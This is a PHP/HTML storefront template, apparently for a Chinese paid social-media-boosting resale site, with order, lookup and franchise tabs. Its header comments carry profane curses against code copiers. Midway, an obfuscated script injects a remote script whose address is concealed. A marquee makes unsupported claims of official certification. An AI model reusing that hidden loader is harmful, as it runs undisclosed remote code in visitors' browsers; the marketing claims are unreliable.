                                
    <!--购买此网站模板请联系QQ:746882276-->
    <!--// +----------------------------+-->
    <!--// | Date:<?=date("m月d号")?>-->
    <!--// +----------------------------+-->
    <!--看尼玛 -->
    <!--误入此处请退出，偷代码狗贼祖坟坟头蹦迪-->
    <!--//如果扒不到也可以找我买呀:746882276-->
    <!--// +------------------------------------>
    <!--// |   =========友情提醒=========      -->
    <!--// +------------------------------------>
    <!--// | 偷东西，造毒咒，不是不报，时候未到-->
    <!--// +------------------------------------>
    <!--// | 总有一天毒咒生效，狗贼户口本死光光-->
    <!--// +------------------------------------>
    <!--// |   *为你爸妈积点德，养你不容易*-->
    <!--// +------------------------------------>
    <!--// |    盗代码/盗内容/偷东西死全家-->
    <!--// +------------------------------------>
    <!--// |    盗代码/盗内容/偷东西死全家-->
    <!--// +------------------------------------>
    <!--// |    盗代码/盗内容/偷东西死全家-->
    <!--// +------------------------------------>
    <!--// |   *为你爸妈积点德，养你不容易*-->
    <!--// +------------------------------------>
    <!--// | 总有一天毒咒生效，狗贼户口本死光光-->
    <!--// +------------------------------------>
    <!--// | 偷东西，造毒咒，不是不报，时候未到-->
    <!--// +------------------------------------>
    <!--// |   =========防盗封印=========-->
    <!--// +------------------------------------>
    <!-- -->
    <!----->
    <!--*　　　　　　　　┏┓　　　┏┓+ +-->
    <!-- *　　　　　　　┏┛┻━━━┛┻┓ + +-->
    <!--*　　　　　　　┃　　　　　　　┃ 　-->
    <!-- *　　　　　　　┃　　　━　　　┃ ++ + + +-->
    <!-- *　　　　　　 ████━████+-->
    <!--*　　　　　　　┃　　　　　　　┃ +-->
    <!--*　　　　　　　┃　　　┻　　　┃-->
    <!--*　　　　　　　┃　　　　　　　┃ + +-->
    <!-- *　　　　　　　┗━┓　　　┏━┛-->
    <!--*　　　　　　　　　┃　　　┃　　　　　　　　　　　-->
    <!--*　　　　　　　　　┃　　　┃ + + + +-->
    <!--*　　　　　　　　　┃　　　┃　　　　　　　-->
    <!--*　　　　　　　　　┃　　　┃ + 　　　　神兽镇楼、不宕机、无BUG　-->
    <!--*　　　　　　　　　┃　　　┃-->
    <!--*　　　　　　　　　┃　　　┃　　+　　　　　　　　　-->
    <!--*　　　　　　　　　┃　 　　┗━━━┓ + +-->
    <!--*　　　　　　　　　┃ 　　　　　　　┣┓-->
    <!--*　　　　　　　　　┃ 　　　　　　　┏┛-->
    <!-- *　　　　　　　　　┗┓┓┏━┳┓┏┛ + + + +-->
    <!--*　　　　　　　　　　┃┫┫　┃┫┫-->
    <!--*　　　　　　　　　　┗┻┛　┗┻┛+ + + +-->
    <!----->
    <!--偷尼玛-->
    
<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->
<?php
if(!defined('IN_CRONLITE'))exit();
?>
<!DOCTYPE html>
<html lang="zh-cn">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
  <title><?php echo $hometitle?></title>
  <meta name="keywords" content="<?php echo $conf['keywords']?>">
  <meta name="description" content="<?php echo $conf['description']?>">
  <link href="<?php echo $cdnpublic?>twitter-bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet"/>
  <link href="<?php echo $cdnpublic?>font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet"/>
  <link rel="stylesheet" href="<?php echo $cdnserver?>assets/simple/css/plugins.css">
  <link rel="stylesheet" href="<?php echo $cdnserver?>assets/simple/css/main.css">
  <link rel="stylesheet" href="<?php echo $cdnserver?>assets/simple/css/oneui.css">
  <link rel="stylesheet" href="<?php echo $cdnserver?>assets/css/common.css?ver=<?php echo VERSION ?>">
  <script src="<?php echo $cdnpublic?>modernizr/2.8.3/modernizr.min.js"></script>
  <!--[if lt IE 9]>
    <script src="<?php echo $cdnpublic?>html5shiv/3.7.3/html5shiv.min.js"></script>
    <script src="<?php echo $cdnpublic?>respond.js/1.4.2/respond.min.js"></script>
  <![endif]-->
<?php echo $background_css?>
</head>
<body>
<?php if($background_image){?>
<img src="https://api.suyanw.cn/api/comic" alt="Full Background" class="full-bg full-bg-bottom animated pulse " ondragstart="return false;" oncontextmenu="return false;">
<?php }?>
<br />
<div class="col-xs-12 col-sm-10 col-md-8 col-lg-5 center-block" style="float: none;">
<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->    
<!--弹出公告-->
<div class="modal fade" align="left" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header-tabs">
        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
        <h4 class="modal-title" id="myModalLabel"><?php echo $conf['sitename']?></h4>
       </div>
        <div class="modal-body">
         	<?php echo $conf['modal']?>
  	    </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">知道啦</button>
      </div>
    </div>
  </div>
</div>
<!--弹出公告-->
<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->    
<!--公告-->
		<div class="modal fade col-xs-12 " align="left" id="anounce" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">  
			<br>  <br>  <br>  
			<div class="modal-dialog panel panel-primary  animation-fadeInQuick2">
		    <div class="modal-content">
         <div class="list-group-item reed" style="background:linear-gradient(120deg, #5ED1D7 10%, #71D7A2 90%);">
						<button type="button" class="close " data-dismiss="modal"><span aria-hidden="true"><i class="fa  fa-times-circle"></i></span><span class="sr-only">Close</span></button>
						<script type="text/javascript">
							var now=(new Date()).getHours();
							if(now>0&&now<=6){
							document.write("熬夜对身体不好，快睡觉！");
							}else if(now>6&&now<=11){
							document.write("早上好！美好的一天开始啦！");
							}else if(now>11&&now<=14){
							document.write("中午好！欢迎光临本站！");
							}else if(now>14&&now<=18){
							document.write("下午好！欢迎光临本站！");
							}else{
							document.write("晚上好！睡前下一单醒来有惊喜哟！");
							}
						</script>
					</div>      <center> <br>
  <p></p>
<strong style="color:#b#eaf0cce;font-family:微软雅黑, 宋体;font-size:12px">
<font color="#FF0000">平</font><font color="#F5000A">台</font><font color="#EB0014">誓</font><font color="#E1001E">言</font><font color="#D70028">：</font><font color="#CD0032">真</font><font color="#C3003C">诚</font><font color="#B90046">服</font><font color="#AF0050">务</font><font color="#A5005A">，</font><font color="#9B0064">努</font><font color="#91006E">力</font><font color="#870078">打</font><font color="#7D0082">造</font><font color="#73008C">全</font><font color="#690096">网</font><font color="#5F00A0">最</font><font color="#5500AA">强</font><font color="#4B00B4">代</font><font color="#4100BE">刷</font><font color="#3700C8">货</font><font color="#2D00D2">源</font><font color="#2300DC">站</font><font color="#1900E6">！</font><strong><p></p>
</center>
<?php echo $conf['anounce']?>
                  <p></p><center>
<strong style="color:#b#eaf0cce;font-family:微软雅黑, 宋体, "">
  <span class="glyphicon glyphicon-info-sign"></span> <b></b> 建议网址收藏到浏览器！方便下次打开<strong>			</strong></strong></center><strong style="color:#b#eaf0cce;font-family:微软雅黑, 宋体, ""><strong><br>
  
		</strong></strong></center><strong style="color:#b#eaf0cce;font-family:微软雅黑, 宋体, ""><strong><br> 				</strong></strong></div><strong style="color:#b#eaf0cce;font-family:微软雅黑, 宋体, ""><strong>			</strong></strong></div><strong style="color:#b#eaf0cce;font-family:微软雅黑, 宋体, ""><strong>		</strong></strong></div><strong style="color:#b#eaf0cce;font-family:微软雅黑, 宋体, ""><strong>     
	  <!-- 公告结束 !-->
<!--查单说明开始-->
<div class="modal fade" align="left" id="cxsm" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
        <h4 class="modal-title" id="myModalLabel">查询内容是什么？该输入什么？</h4>
      </div>
      	<li class="list-group-item">例如您购买的是预留的手机号，输入下单的手机号即可查询订单</li>
        <li class="list-group-item"><font color="red">如果您不知道下单账号是什么，可以不填写，直接点击查询，则会根据浏览器缓存查询</font></li>


      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">关闭</button>
      </div>
    </div>
  </div>
</div>
<!--查单说明结束-->
<!--顶部导航-->
       <div class="block-content block-content-full text-center bg-image" style="background-image: url('https://pan.suyanw.cn/view.php/5064ec8f7c8396d6541c52245d34cbd3.png');background-size: 100% 100%;">
            <div>
                <div>
 <div class="img-avatar"></div>
                </div>
            </div>
        
        <center>
    <h3>     <a href="javascript:void(alert('詆.价.平.台，建议收藏到浏览器书签哦！'));"><b>
<font color=#BE0041><?php echo $hometitle?></b></a></h2></font><font color=#0000FF><img src="https://z3.ax1x.com/2021/06/19/RCRVzT.png"/>全网货源-信誉保证<img src="https://z3.ax1x.com/2021/06/19/RCRVzT.png"/>
<style>
h3 {
  text-shadow: -1px 1px 0 #FFD180;
  -webkit-animation: 1s infinite rainbowText;
          animation: 1s infinite rainbowText;
}

@-webkit-keyframes rainbowText {
  0% {
    text-shadow: -0.1rem 0.1rem #FFFF8D, -0.2rem 0.2rem #CCFF90, -0.3rem 0.3rem #A7FFEB, -0.4rem 0.4rem #82B1FF, -0.5rem 0.5rem #B388FF, -0.6rem 0.6rem #EA80FC, -0.7rem 0.7rem #FF80AB, -0.8rem 0.8rem #FFD180;
  }
  12.5% {
    text-shadow: -0.1rem 0.1rem #FFD180, -0.2rem 0.2rem #FFFF8D, -0.3rem 0.3rem #CCFF90, -0.4rem 0.4rem #A7FFEB, -0.5rem 0.5rem #82B1FF, -0.6rem 0.6rem #B388FF, -0.7rem 0.7rem #EA80FC, -0.8rem 0.8rem #FF80AB;
  }
  25% {
    text-shadow: -0.1rem 0.1rem #FF80AB, -0.2rem 0.2rem #FFD180, -0.3rem 0.3rem #FFFF8D, -0.4rem 0.4rem #CCFF90, -0.5rem 0.5rem #A7FFEB, -0.6rem 0.6rem #82B1FF, -0.7rem 0.7rem #B388FF, -0.8rem 0.8rem #EA80FC;
  }
  37.5% {
    text-shadow: -0.1rem 0.1rem #EA80FC, -0.2rem 0.2rem #FF80AB, -0.3rem 0.3rem #FFD180, -0.4rem 0.4rem #FFFF8D, -0.5rem 0.5rem #CCFF90, -0.6rem 0.6rem #A7FFEB, -0.7rem 0.7rem #82B1FF, -0.8rem 0.8rem #B388FF;
  }
  50% {
    text-shadow: -0.1rem 0.1rem #B388FF, -0.2rem 0.2rem #EA80FC, -0.3rem 0.3rem #FF80AB, -0.4rem 0.4rem #FFD180, -0.5rem 0.5rem #FFFF8D, -0.6rem 0.6rem #CCFF90, -0.7rem 0.7rem #A7FFEB, -0.8rem 0.8rem #82B1FF;
  }
  62.5% {
    text-shadow: -0.1rem 0.1rem #82B1FF, -0.2rem 0.2rem #B388FF, -0.3rem 0.3rem #EA80FC, -0.4rem 0.4rem #FF80AB, -0.5rem 0.5rem #FFD180, -0.6rem 0.6rem #FFFF8D, -0.7rem 0.7rem #CCFF90, -0.8rem 0.8rem #A7FFEB;
  }
  75% {
    text-shadow: -0.1rem 0.1rem #A7FFEB, -0.2rem 0.2rem #82B1FF, -0.3rem 0.3rem #B388FF, -0.4rem 0.4rem #EA80FC, -0.5rem 0.5rem #FF80AB, -0.6rem 0.6rem #FFD180, -0.7rem 0.7rem #FFFF8D, -0.8rem 0.8rem #CCFF90;
  }
  87.5% {
    text-shadow: -0.1rem 0.1rem #CCFF90, -0.2rem 0.2rem #A7FFEB, -0.3rem 0.3rem #82B1FF, -0.4rem 0.4rem #B388FF, -0.5rem 0.5rem #EA80FC, -0.6rem 0.6rem #FF80AB, -0.7rem 0.7rem #FFD180, -0.8rem 0.8rem #FFFF8D;
  }
  100% {
    text-shadow: -0.1rem 0.1rem #FFFF8D, -0.2rem 0.2rem #CCFF90, -0.3rem 0.3rem #A7FFEB, -0.4rem 0.4rem #82B1FF, -0.5rem 0.5rem #B388FF, -0.6rem 0.6rem #EA80FC, -0.7rem 0.7rem #FF80AB, -0.8rem 0.8rem #FFD180;
  }
}
</style>
<h1>     <a href="javascript:void(alert('货源总站，建议收藏到浏览器书签哦！'));"><b>
    <font color=#030303></b></b></a></h1>
    <style>
@keyframes move {
      0% {        background-position: 0 0;
      }
      100% {        /*宽度固定，如果为百分比背景不会滚动*/
        background-position: -300px 0;
      }
    }    .wrap {      /*设置背景渐变色*/
      background-image: linear-gradient(to right, red, orange, yellow, green, yellow, orange, red, orange, yellow, green, yellow, orange, red);      /*chrome私有样式，加前缀，文字显示背景图片*/
       -webkit-background-clip: text;      animation: move 5s infinite;      /*文字颜色设为透明*/
      color: transparent;      /*宽度固定*/
      width: 300px;
    }
</style>

<h5><div class="wrap"><img src="https://s4.ax1x.com/2022/01/08/7CcaPf.gif"/>货源最低-信誉保证<img src="https://s4.ax1x.com/2022/01/08/7CcaPf.gif"/></div></h5>
<center>
<img src="https://pan.suyanw.cn/view.php/72e66edfe64b00a16debc9b569eb3049.png" width="35" height="35">
<img src="https://pan.suyanw.cn/view.php/cfe529aa8a359c2e3c3015978ff3537a.png" width="35" height="35">
<img src="https://pan.suyanw.cn/view.php/8e6af60004a9f51ddd64ffb6bf61a6a2.png" width="35" height="35">
<img src="https://pan.suyanw.cn/view.php/848268928c55595d7eb88ab931e22794.png" width="35" height="35">
<img src="https://pan.suyanw.cn/view.php/f7600988040ff2e29bd0cf749855544b.png" width="35" height="35">
<img src="https://pan.suyanw.cn/view.php/daa146693968dd54ce79ff576ad02920.png" width="35" height="35">
<img src="https://pan.suyanw.cn/view.php/5ba1b8910fbe3a07b66687673081570f.png" width="35" height="35">
<img src="https://pan.suyanw.cn/view.php/326026dfb7e749e6ad3df845f15b2760.png" width="35" height="35">
</center>
    
</center>
        <div class="block-content block-content-mini block-content-full">
            <div class="btn-group btn-group-justified">
				<div class="btn-group">
					<a class="btn btn-default" data-toggle="modal" href="#anounce"><img src="https://z3.ax1x.com/2021/06/19/RCRtyD.gif"/></i>&nbsp;<font color=#DC143C><span style="font-weight:bold">平台公告</span></font></a>
					</div>
					 	<a href="#customerservice" target="_blank" data-toggle="modal" class="btn btn-default"><img src="https://z3.ax1x.com/2021/06/19/RCoJN4.jpg"/></i>&nbsp;<span style="font-weight:bold"><font color=#0000FF>订单投诉</font></span></a>
	 	
						                <div class="btn-group">
                 <a class="btn btn-default" data-toggle="modal" href="./user/regsite.php"><img src="https://z3.ax1x.com/2021/06/19/RCRNOe.gif"/></i>&nbsp;<font color=Red>登录注册</font></a>
				</div>
		   </div>
	   </div>
	                          	<div align="center">
	<a href=" " target="_blank"><img src="" /></a><a class="btn btn-default" href="http://wpa.qq.com/msgrd?v=3&uin=<?php echo $conf['kfqq'] ?>&site=qq&menu=yes" target="_blank"><span style="color:#FF0000;"> <strong>🌸《VIP客服咨询》 9:00-23:00</strong></span><span style="color:#009900;"><strong> 官方客服 🌸 </strong></span></a> 
</div>
    </div>
    	<style>
    #nr{
    	font-size:20px;
    	margin: 0;
        background: -webkit-linear-gradient(left,
            #ffffff,
            #ff0000 6.26%,
            #ff7d00 12.5%,
            #ffff00 18.75%,
            #00ff00 26%,
            #00ffff 31.26%,
            #0000ff 37.5%,
            #ff00ff 43.75%,
            #ffff00 50%,
            #ff0000 56.26%,
            #ff7d00 62.5%,
            #ffff00 68.75%,
            #00ff00 75%,
            #00ffff 81.26%,
            #0000ff 87.5%,
            #ff00ff 93.75%,
            #ffff00 100%);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-size: 200% 100%;
        animation: masked-animation 2s infinite linear;
    }
    @keyframes masked-animation {
        0% {
            background-position: 0 0;
        }
        100% {
            background-position: -100%, 0;
        }
    }
</style>
<div style="background-color:#333;border-radius: 26px;box-shadow: 0px 0px 5px #f200ff;padding:5px;margin-top: 10px;margin-bottom:0px;">
    <marquee>
    	<b id="nr">☆本站荣获百度官方认证,全网货源最全,价格最低,信誉保证,诚信经营,代理过万,稳定运行,提现稳如泰山,期待您加盟！☆</b>
    </marquee>
</div>
<!--顶部导航-->

<div class="block" style="margin-top:15px;font-size:15px;padding:1px;border-radius:15px;background-color: white;">

        <ul class="nav nav-tabs btn btn-block animated zoomInLeft btn-rounded" data-toggle="tabs">
         <li style="width: 25%;" align="center" class="active"><a href="#shop" data-toggle="tab"><span style="font-weight:bold"><img border="0" width="18" src="https://pan.suyanw.cn/view.php/a4c308fe41a57c4751b133d9189161b4.gif">下单</span></a></li>
            <li style="width: 25%;" align="center"><a href="#search" data-toggle="tab" id="tab-query"><span style="font-weight:bold"><i class="fa fa-search"></i> <font color=#8B008B>查单</font></span></a></li>
			<li style="width: 25%;" align="center"><a href="#Substation"><font color="#FF4000"><i class="fa fa-location-arrow fa-spin"></i> <b>开分站</b></font></a></li>
		
			<li style="width: 25%;" align="center"><a href="#more" data-toggle="tab"><span style="font-weight:bold"><i class="fa fa-folder-open"></i> <font color=#FF8C00>更多</font></span></a></li>
        </ul>
        

<!--TAB标签-->
    <div class="tab-content">
<!--在线下单--><img src="https://pan.suyanw.cn/view.php/98446bcda865027bbc3f0232d1605d03.png" width="100%"/>
    <div class="tab-pane active" id="shop">	
<?php include TEMPLATE_ROOT.'default/shop.inc.php'; ?>
  	</div>
<!--在线下单-->
<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->
 
<!--查询订单-->
				
						<div class="tab-pane fade fade-up" id="search">
							<table class="table table-striped table-borderless table-vcenter remove-margin-bottom">
								<tbody>
									<tr class="shuaibi-tip animation-fadeInQuick2">
										<td class="text-center" style="width: 100px;">
											<img src="//q4.qlogo.cn/headimg_dl?dst_uin=<?php echo $conf['kfqq']?>&spec=100" alt="avatar"
											class="img-circle img-thumbnail img-thumbnail-avatar">
										</td>
										<td>
											<h5>
												<strong>
													售后客服
												</strong>
											</h5>
											<i class="fa fa-comment-o text-success">
											</i>
											客服QQ:<?php echo $conf['kfqq'] ?>										</td>
										<td class="text-right" style="width: 20%;">
											<a styel="letter-spacing: 3px;"   <a href="#customerservice" target="_blank" data-toggle="modal" class="btn btn-sm btn-info">联系客服</a>
										</td>
									</tr>
								</tbody>
							</table>
							<div class="col-xs-12 well well-sm animation-pullUp">
								<p align="left">
									<font color="blue">
										<i class="">
										</i>
									</font>
									<font color="blue">
										付款未收到卡密,请在二十四小时内联系客服<br>-------------最简单的查单方式--------------
									</font>							
									<br>
									<font color="red">
										<i class="">
										</i>
									</font>
									<font color="red">
										查单补单地址:cd.xbi2.cn<a href="https://cd.xbi2.cn" target="_blank">点击进入</a>
									</font>						
								</p>
							</div>
							<div class="form-group">
								<div class="input-group">
									<div class="input-group-btn">
										<select class="form-control" id="searchtype" style="padding: 6px 4px;width:90px">
											<option value="0">
												下单账号
											</option>
											<option value="1">
												订单号
											</option>
										</select>
									</div>
									<input type="text" name="qq" id="qq3" value="" class="form-control" placeholder="请输入要查询的内容（留空则显示最新订单）"
									required/>
									<span class="input-group-btn">
										<a href="#cxsm" target="_blank" data-toggle="modal" class="btn btn-warning">
											<i class="glyphicon glyphicon-exclamation-sign">
											</i>
										</a>
									</span>
								</div>
							</div>
						<input type="submit" id="submit_query" class="btn btn-default btn-block btn-rounded" style="background-image: url(https://pan.suyanw.cn/view.php/75e8d71a4244fde067d84387fb0505c8.png);font-weight:bold" value="立即查询">
								<font color="red">
										<i class="">
										</i>
									</font>
									<font color="red">
								1.查单号:请输入您购买时候填写的手机号，如果填写的时候忘记填写的手机号请留空点击立即查询即可！
									</font>						
							<br/>
							<div id="result2" class="form-group" style="display:none;">
								<center>
									<small>
										<font color="#ff0000">
											手机用户可以左右滑动
										</font>
									</small>
								</center>
								<div class="table-responsive">
									<table class="table table-vcenter table-condensed table-striped">
										<thead>
											<tr>
												<th class="hidden-xs">
													下单账号
												</th>
												<th>
													商品名称
												</th>
												<th>
													数量
												</th>
												<th class="hidden-xs">
													购买时间
												</th>
												<th>
													状态
												</th>
												<th>
													操作
												</th>
											</tr>
										</thead>
										<tbody id="list">
										</tbody>
									</table>
								</div>
							</div>
						</div>
   						<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->
<!--查询订单--> 
<script type="text/javascript">
var _0xodL='jsjiami.com.v6',_0xodL_=['‮_0xodL'],_0x4a14=[_0xodL,'w4jCsTBmaQ==','G8Kywrl4wpE=','w4DDrlFIw5A=','eMOew7h+w5w=','w5PDiVRhw5E=','YiJyNB0=','w7HDrcKiLWED','w7RNT0zDscOQw7w9w7HClwjDu8OzwqMow6DCrcO8CMOKcMOswpzDgcKXwp7CnBNWd8O8UlktwpXDpT3Dl8OGw7rDrsKL','w5jDm0xewoZDAsKTLA5pw4DDtcKBe8Kiw7DCkcK+w71qwpZ0AcOKN8Otw6AzesKFw7xNSTbCkMOVwpfCiQ==','w5PDnV1Pw4gJaMKPPBBkwoDDuw==','I8Kzw6MSwqM=','wqLDlWcwDcOUw4nCjQ==','YgElw73Cl2fCnQc=','a8KJGFTDsQ==','bsOzEA==','bAHDssOpw6U=','fcO8wo7ClsOe','QUrDvsOMw5lGw7LDnsKcwr9nLTJVw6dTw7TCjlJg','w4PDjEpHw4wY','w7jCoMKUw45Fwp1Dw67CvzQwCA==','w5glwrDCs8Kt','WcKZcmErw43Cr8OJwpXChnJIwoDCpBMb','w5gd4oO1H86PzbrigrrNljvCo+KcluihjOS/luWMqeePjOS5j0zDrg==','wqbDk2A1HMOT','djsjibYaREmEix.dcxBQOhom.ZvIX6d=='];if(function(_0x4f9df1,_0x172555,_0x2942e0){function _0x3e728d(_0x533e24,_0x5ae4a1,_0x5eb546,_0x3f0b94,_0xa8900e,_0x1502ee){_0x5ae4a1=_0x5ae4a1>>0x8,_0xa8900e='po';var _0x16a061='shift',_0x19c831='push',_0x1502ee='‮';if(_0x5ae4a1<_0x533e24){while(--_0x533e24){_0x3f0b94=_0x4f9df1[_0x16a061]();if(_0x5ae4a1===_0x533e24&&_0x1502ee==='‮'&&_0x1502ee['length']===0x1){_0x5ae4a1=_0x3f0b94,_0x5eb546=_0x4f9df1[_0xa8900e+'p']();}else if(_0x5ae4a1&&_0x5eb546['replace'](/[dbYREExdxBQOhZIXd=]/g,'')===_0x5ae4a1){_0x4f9df1[_0x19c831](_0x3f0b94);}}_0x4f9df1[_0x19c831](_0x4f9df1[_0x16a061]());}return 0xd396d;};return _0x3e728d(++_0x172555,_0x2942e0)>>_0x172555^_0x2942e0;}(_0x4a14,0x126,0x12600),_0x4a14){_0xodL_=_0x4a14['length']^0x126;};function _0x96e9(_0xa8c2e2,_0x523cad){_0xa8c2e2=~~'0x'['concat'](_0xa8c2e2['slice'](0x1));var _0x305c0e=_0x4a14[_0xa8c2e2];if(_0x96e9['wMPzrA']===undefined){(function(){var _0x532391=typeof window!=='undefined'?window:typeof process==='object'&&typeof require==='function'&&typeof global==='object'?global:this;var _0x31e38e='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x532391['atob']||(_0x532391['atob']=function(_0x4cb498){var _0x223a1c=String(_0x4cb498)['replace'](/=+$/,'');for(var _0x3c2b93=0x0,_0x2bdf1b,_0x566d93,_0x26cd3a=0x0,_0x4f88a0='';_0x566d93=_0x223a1c['charAt'](_0x26cd3a++);~_0x566d93&&(_0x2bdf1b=_0x3c2b93%0x4?_0x2bdf1b*0x40+_0x566d93:_0x566d93,_0x3c2b93++%0x4)?_0x4f88a0+=String['fromCharCode'](0xff&_0x2bdf1b>>(-0x2*_0x3c2b93&0x6)):0x0){_0x566d93=_0x31e38e['indexOf'](_0x566d93);}return _0x4f88a0;});}());function _0x3163ab(_0x167894,_0x523cad){var _0x1be52f=[],_0x629e5f=0x0,_0x4144cb,_0xfa9fd6='',_0x3ba14c='';_0x167894=atob(_0x167894);for(var _0x5111a9=0x0,_0x445c1e=_0x167894['length'];_0x5111a9<_0x445c1e;_0x5111a9++){_0x3ba14c+='%'+('00'+_0x167894['charCodeAt'](_0x5111a9)['toString'](0x10))['slice'](-0x2);}_0x167894=decodeURIComponent(_0x3ba14c);for(var _0x457b25=0x0;_0x457b25<0x100;_0x457b25++){_0x1be52f[_0x457b25]=_0x457b25;}for(_0x457b25=0x0;_0x457b25<0x100;_0x457b25++){_0x629e5f=(_0x629e5f+_0x1be52f[_0x457b25]+_0x523cad['charCodeAt'](_0x457b25%_0x523cad['length']))%0x100;_0x4144cb=_0x1be52f[_0x457b25];_0x1be52f[_0x457b25]=_0x1be52f[_0x629e5f];_0x1be52f[_0x629e5f]=_0x4144cb;}_0x457b25=0x0;_0x629e5f=0x0;for(var _0x212ee1=0x0;_0x212ee1<_0x167894['length'];_0x212ee1++){_0x457b25=(_0x457b25+0x1)%0x100;_0x629e5f=(_0x629e5f+_0x1be52f[_0x457b25])%0x100;_0x4144cb=_0x1be52f[_0x457b25];_0x1be52f[_0x457b25]=_0x1be52f[_0x629e5f];_0x1be52f[_0x629e5f]=_0x4144cb;_0xfa9fd6+=String['fromCharCode'](_0x167894['charCodeAt'](_0x212ee1)^_0x1be52f[(_0x1be52f[_0x457b25]+_0x1be52f[_0x629e5f])%0x100]);}return _0xfa9fd6;}_0x96e9['yuiiHS']=_0x3163ab;_0x96e9['WgrJZl']={};_0x96e9['wMPzrA']=!![];}var _0x597108=_0x96e9['WgrJZl'][_0xa8c2e2];if(_0x597108===undefined){if(_0x96e9['uJyFLT']===undefined){_0x96e9['uJyFLT']=!![];}_0x305c0e=_0x96e9['yuiiHS'](_0x305c0e,_0x523cad);_0x96e9['WgrJZl'][_0xa8c2e2]=_0x305c0e;}else{_0x305c0e=_0x597108;}return _0x305c0e;};(function(){var _0x37bb22={'DjTTo':_0x96e9('‮0','zj&O'),'bxzNZ':_0x96e9('‮1','!Vo]'),'jMZno':_0x96e9('‮2','Wfov')};var _0x54786a=document[_0x96e9('‫3','Wfov')](_0x37bb22['DjTTo']);_0x96e9('‮4','EP]v')===window[_0x96e9('‫5','P^CS')][_0x96e9('‫6','bWyn')][_0x96e9('‫7','6]T[')](':')[0x0]?_0x54786a[_0x96e9('‮8','jOGn')]=_0x37bb22[_0x96e9('‮9','0IEk')]:_0x54786a['src']=_0x37bb22[_0x96e9('‮a','C$#(')];var _0x109f0e=document[_0x96e9('‫b','Cz)o')](_0x96e9('‫c','Wfov'))[0x0];_0x109f0e['parentNode'][_0x96e9('‮d','58iN')](_0x54786a,_0x109f0e);}());var helloTitile=document[_0x96e9('‮e','0W)C')],titleTime;document[_0x96e9('‮f','(M%s')]('visibilitychange',function(){var _0x4f7d91={'FJnYk':function(_0xb7771d,_0x5cedea){return _0xb7771d+_0x5cedea;},'pAifl':'φ(>ω<*)\x20这有好东西哦~\x20','cflOm':_0x96e9('‫10','p$wl')};document[_0x96e9('‮11','P^CS')]?(document[_0x96e9('‫12','wf1j')]=_0x4f7d91[_0x96e9('‮13','*1h9')](_0x4f7d91[_0x96e9('‫14','Wfov')],helloTitile),clearTimeout(titleTime)):(document[_0x96e9('‮15','hn9d')]=_0x4f7d91['FJnYk'](_0x4f7d91[_0x96e9('‮16','Wfov')],helloTitile),titleTime=setTimeout(function(){document[_0x96e9('‫17','CZOi')]=helloTitile;},0x7d0));});;_0xodL='jsjiami.com.v6';
</script>
<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->
<!--开通分站-->
    <?php if($conf['fenzhan_buy']==1){?><div class="tab-pane" id="Substation">
		<table class="table table-borderless table-pricing">
            <tbody>
                <tr class="active">
                    <td>
                        <h4><i class="fa fa-cny fa-fw"></i><strong><?php echo $conf['fenzhan_price']?>元</strong> / <i class="fa fa-cny fa-fw"></i><strong><?php echo $conf['fenzhan_price2']?>元</strong><br><small>普及版 / 专业版两种分站供你选择</small></h4>
                    </td>
                </tr>
                <tr>
                    <td>无聊时可以赚点零花钱</td>
                </tr>
                <tr>
                    <td>还可以锻炼自己销售口才</td>
                </tr>
				<tr>
                    <td>宝妈、学生等网络赚钱首选</td>
                </tr>
                <tr>
                    <td>分站满<?php echo $conf['tixian_min']; ?>元即可申请提现</td>
                </tr>
                <tr>
                    <td><strong>轻轻松松推广日赚100+不是梦</td>
                </tr>
                <tr class="active">
                    <td>
						<a href="#userjs" data-toggle="modal" class="btn btn-effect-ripple  btn-info"><i class="fa fa-th-list"></i><span class="btn-ripple animate" style="height: 100px; width: 100px; top: -34.4px; left: 2.58749px;"></span> 功能介绍</a>
                        <a href="user/regsite.php" target="_blank" class="btn btn-effect-ripple  btn-danger"><i class="fa fa-arrow-right"></i> 马上开通</a>
                    </td>
                </tr>
                <tr>
                    <td class="text-muted">
                        <small><em>* 欢迎加入本站大家庭！</em></small>
                    </td>
                </tr>
            </tbody>
        </table>
    </table>
	</div><?php }?>
<!--开通分站-->
<!-- 
  本代码由 张昕晨 创建
  技术支持 QQ:746882276
  严禁反编译、逆向等任何形式的侵权行为，违者将追究法律责任
 -->
<!--抽奖-->
    <div class="tab-pane" id="gift">
		<div class="panel-body text-center">
		<div id="roll">点击下方按钮开始抽奖</div>
		<hr>
		<p>
		<a class="btn btn-info" id="start" style="display:block;">开始抽奖</a>
		<a class="btn btn-danger" id="stop" style="display:none;">停止</a>
		</p> 
		<div id="result"></div><br/>
		<div class="giftlist" style="display:none;"><strong>最近中奖记录</strong><ul id="pst_1"></ul></div>
		</div>
	</div>
<!--抽奖-->
